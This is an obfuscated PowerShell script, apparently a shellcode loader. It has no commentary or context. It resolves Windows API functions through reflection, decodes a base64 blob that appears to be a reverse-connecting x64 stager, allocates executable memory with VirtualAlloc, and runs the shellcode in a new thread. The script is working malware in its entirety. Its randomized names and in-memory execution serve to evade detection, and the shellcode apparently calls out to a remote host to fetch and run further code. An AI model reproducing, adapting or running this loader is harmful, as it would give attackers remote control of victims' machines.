
function vCfL5pqJjpD0 {
	Param ($wxwihB, $gPZuopWAW3F_)		
	$troJY = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $troJY.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($troJY.GetMethod('GetModuleHandle')).Invoke($null, @($wxwihB)))), $gPZuopWAW3F_))
}

function pPQZIeMKnDly {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $ehzB,
		[Parameter(Position = 1)] [Type] $r6a = [Void]
	)
	
	$iLHpz697gR = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$iLHpz697gR.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ehzB).SetImplementationFlags('Runtime, Managed')
	$iLHpz697gR.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r6a, $ehzB).SetImplementationFlags('Runtime, Managed')
	
	return $iLHpz697gR.CreateType()
}

[Byte[]]$eRwFC = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcd/bcGEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$xSq0 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vCfL5pqJjpD0 kernel32.dll VirtualAlloc), (pPQZIeMKnDly @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $eRwFC.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($eRwFC, 0, $xSq0, $eRwFC.length)

$xLse3gMxfa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vCfL5pqJjpD0 kernel32.dll CreateThread), (pPQZIeMKnDly @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$xSq0,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((vCfL5pqJjpD0 kernel32.dll WaitForSingleObject), (pPQZIeMKnDly @([IntPtr], [Int32]))).Invoke($xLse3gMxfa,0xffffffff) | Out-Null
